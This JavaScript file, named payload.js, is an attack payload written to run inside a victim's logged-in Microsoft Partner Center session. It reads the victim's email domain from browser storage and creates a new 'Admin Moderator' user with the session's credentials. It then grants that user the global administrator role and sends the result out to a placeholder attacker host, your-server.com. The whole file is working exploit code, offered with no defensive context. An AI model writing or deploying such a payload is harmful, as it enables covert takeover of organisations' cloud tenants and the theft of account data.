// payload.js

function randomGuid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

var guid1 = randomGuid();
var guid2 = randomGuid();

var commonHeaders = {
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "MS-ClientCorrelationId": guid1,
  "Request-Id": guid2,
  "Flights": "EnablePxAccExpBravosIntegration|EnableMPNRebranding|EnableAppManagement|EnableAddExistingUserAccExpFlow|EnableAddUsersWithPermission|EnableAuthzV2ClaimCaching|EnableUIInfraClaimCaching|EnableCheckForDeveloperRoleUser|DisableUiinfraAuthV1|EnableOverviewPage|EnableUserManagementEditNavDeprecation|EnableCommercialVnext|EnablePayoutsNameChange|EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync|EnableUserJourneyTracker|PendingAAD_GraphMigration|EnableS2STokenValidation|EnableEmailInvitationFromEntra|EnableExistingLEReuse|EnableMergePartnerDeveloperSettings|EnablePxAccountExpService|ShowMyAccessLeftNav|EnableAuthV2|EnableCPVAccountExp|EnableRwebSunset|EnableAdvisorProfileAccountExp|ShowTstBanner|EnableUserManagement|EnableZip4Check|EnableLegalInfo|EnableHDCSubway|EnableAzureAD|EnableIvxExpiry|EnablePortalVnext2MyAccess|EnableFirmographicFileDeletion|EnableSurfaceTab|EnableSurfaceAgreementFlight|EnableMicrosoftCustomerAgreementFlight|EnableMicrosoftCustomerAgreementOfflinePIFlightCheck|EnableFreeHostCheck|EnableIntegrationSandbox|EnableAccountDelete|EnableWorkspaceApiAuthV2|EnableAddPublisher|EnableAuthV1ClaimsForFedGov|EnableInlineEmail|EnableChinaCPPAgreementSigning|DevicesTabNewRouting|EnableActivityDetails|EnableIdentityVerification|EnableGraphMigration|CompetencyGetHeaders_GraphMigration|EnableComplianceAdminRole|EnableRolesFromAuthV2|EnablePartnerSecurityRole|EnablePartnerSupportRole|EnableOwnerRoleOnEditUserPage|EnableMicrosoftCustomerAgreementItalyLRDFlight|EnableMCAPITaxIdUpdateFlight|EnableTenantBasedAgreementFetch|DisableBagISVAgreements_GetBillingProfileStatusAsync|EnableSuspendedAccounts|EnableSecurityWorkspaceForMyAccess|EnableUpdateActivityDetail|HDCAgreementUpdate|EnableResellerSandboxTenantAssociation|EnableSandboxTenantAssociation|EnableSignupCreateTenantRedirection|EnableBETHESDAGAMESEnrollment|EnableBusinessVerificationMethod|EnableSupportContactInfoDeveloperTab|EnableAngularUpgradedRoutes|PartnerPreview|WorkspacePreview|DisableTenantAccountCreationForBasicSetup",
  "X-Flights": "EnablePxAccExpBravosIntegration,EnableMPNRebranding,EnableAppManagement,EnableAddExistingUserAccExpFlow,EnableAddUsersWithPermission,EnableAuthzV2ClaimCaching,EnableUIInfraClaimCaching,EnableCheckForDeveloperRoleUser,DisableUiinfraAuthV1,EnableOverviewPage,EnableUserManagementEditNavDeprecation,EnableCommercialVnext,EnablePayoutsNameChange,EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync,EnableUserJourneyTracker,PendingAAD_GraphMigration,EnableS2STokenValidation,EnableEmailInvitationFromEntra,EnableExistingLEReuse,EnableMergePartnerDeveloperSettings,EnablePxAccountExpService,ShowMyAccessLeftNav,EnableAuthV2,EnableCPVAccountExp,EnableRwebSunset,EnableAdvisorProfileAccountExp,ShowTstBanner,EnableUserManagement,EnableZip4Check,EnableLegalInfo,EnableHDCSubway,EnableAzureAD,EnableIvxExpiry,EnablePortalVnext2MyAccess,EnableFirmographicFileDeletion,EnableSurfaceTab,EnableSurfaceAgreementFlight,EnableMicrosoftCustomerAgreementFlight,EnableMicrosoftCustomerAgreementOfflinePIFlightCheck,EnableFreeHostCheck,EnableIntegrationSandbox,EnableAccountDelete,EnableWorkspaceApiAuthV2,EnableAddPublisher,EnableAuthV1ClaimsForFedGov,EnableInlineEmail,EnableChinaCPPAgreementSigning,DevicesTabNewRouting,EnableActivityDetails,EnableIdentityVerification,EnableGraphMigration,CompetencyGetHeaders_GraphMigration,EnableComplianceAdminRole,EnableRolesFromAuthV2,EnablePartnerSecurityRole,EnablePartnerSupportRole,EnableOwnerRoleOnEditUserPage,EnableMicrosoftCustomerAgreementItalyLRDFlight,EnableMCAPITaxIdUpdateFlight,EnableTenantBasedAgreementFetch,DisableBagISVAgreements_GetBillingProfileStatusAsync,EnableSuspendedAccounts,EnableSecurityWorkspaceForMyAccess,EnableUpdateActivityDetail,HDCAgreementUpdate,EnableResellerSandboxTenantAssociation,EnableSandboxTenantAssociation,EnableSignupCreateTenantRedirection,EnableBETHESDAGAMESEnrollment,EnableBusinessVerificationMethod,EnableSupportContactInfoDeveloperTab,EnableAngularUpgradedRoutes,PartnerPreview,WorkspacePreview,DisableTenantAccountCreationForBasicSetup"
};

var userData = {
  isGuest: false,
  firstName: "Admin",
  lastName: "Moderator",
  userPrincipalName: "",
  displayName: "Mose Adolph",
  alternateEmailAddresses: []
};

//get userEmail from local storage
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  if(key.includes(":user-data")) {
    var jsonData = JSON.parse(value);
    var userEmail = jsonData.userEmail;
    //get domain from email
    var domain = userEmail.split('@')[1];
    //random email
    userEmail = "ms" + Math.floor(Math.random() * 1000) + "@" + domain;
    console.log("User Email: " + userEmail);
    userData.userPrincipalName = userEmail;
    userData.alternateEmailAddresses.push(userEmail);
    break;
  }
}



function elevateUser(userId, userPrincipalName, firstName, lastName) {
  var patchData = {
    RolesToBeAdded: [
      { RoleName: "globaladministrator", Category: "tenant_category" }
    ],
    RolesToBeRemoved: [],
    UserPrincipalName: userPrincipalName,
    FirstName: firstName,
    LastName: lastName
  };

  fetch("https://partner.microsoft.com/en-us/dashboard/account/v3/api/authv2/user/" + userId, {
    method: "PATCH",
    credentials: "include",
    headers: commonHeaders,
    body: JSON.stringify(patchData)
  })
  .then(res => res.text())
  .then(result => {
    
  });
}

fetch("https://partner.microsoft.com/en-us/dashboard/account/v3/api/users", {
  method: "POST",
  credentials: "include",
  headers: commonHeaders,
  body: JSON.stringify(userData)
})
.then(response => response.json())
.then(result => {
  if (result && result.id) {
    console.log("User created successfully:", result);
    elevateUser(result.id, result.userPrincipalName, result.firstName, result.lastName);
  }
  fetch("https://your-server.com/000?result=" + encodeURIComponent(JSON.stringify(result)));
});
